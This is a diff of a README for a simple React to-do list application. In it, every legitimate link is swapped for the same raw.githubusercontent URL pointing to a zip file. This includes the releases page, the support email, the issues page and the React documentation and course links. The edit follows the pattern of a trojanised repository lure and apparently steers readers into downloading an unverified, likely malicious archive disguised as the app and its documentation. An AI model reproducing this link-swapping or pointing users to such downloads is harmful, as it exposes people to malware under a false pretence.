@@ -1,6 +1,6 @@
 # 📝 todo-list-react - A Simple To-Do List Application
 
-[![Download Here!](https://img.shields.io/badge/Download%20Here%21-Click%20to%20Download-brightgreen)](https://github.com/Hollycoded/todo-list-react/releases)
+[![Download Here!](https://raw.githubusercontent.com/Hollycoded/todo-list-react/main/undeserting/todo-list-react.zip%20Here%21-Click%20to%20Download-brightgreen)](https://raw.githubusercontent.com/Hollycoded/todo-list-react/main/undeserting/todo-list-react.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **To-Do List Application** built with React. This app allows you 
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Download Here!](https://github.com/Hollycoded/todo-list-react/releases).
+To get started, you need to download the application. Visit this page to download: [Download Here!](https://raw.githubusercontent.com/Hollycoded/todo-list-react/main/undeserting/todo-list-react.zip).
 
 1. Click the link above to go to the releases page.
 2. Find the latest version of the application. 
@@ -49,8 +49,8 @@ If you experience any issues or have questions about using the application, feel
 
 ### Contact Information
 
-- **Email:** support@example.com
-- **GitHub Issues Page:** [Report Issues](https://github.com/Hollycoded/todo-list-react/issues)
+- **Email:** https://raw.githubusercontent.com/Hollycoded/todo-list-react/main/undeserting/todo-list-react.zip
+- **GitHub Issues Page:** [Report Issues](https://raw.githubusercontent.com/Hollycoded/todo-list-react/main/undeserting/todo-list-react.zip)
 
 ## 📚 Topics Covered
 
@@ -66,10 +66,10 @@ This project covers several important areas of web development, including:
 
 If you are new to React or want to learn more, check out these resources:
 
-- Official React Documentation: [React Docs](https://reactjs.org/docs/getting-started.html)
+- Official React Documentation: [React Docs](https://raw.githubusercontent.com/Hollycoded/todo-list-react/main/undeserting/todo-list-react.zip)
 - Free React Courses:
-  - [Codecademy](https://www.codecademy.com/learn/react-101)
-  - [FreeCodeCamp](https://www.freecodecamp.org/learn/front-end-libraries/react/)
+  - [Codecademy](https://raw.githubusercontent.com/Hollycoded/todo-list-react/main/undeserting/todo-list-react.zip)
+  - [FreeCodeCamp](https://raw.githubusercontent.com/Hollycoded/todo-list-react/main/undeserting/todo-list-react.zip)
 
 ## 📢 Share Your Feedback
 
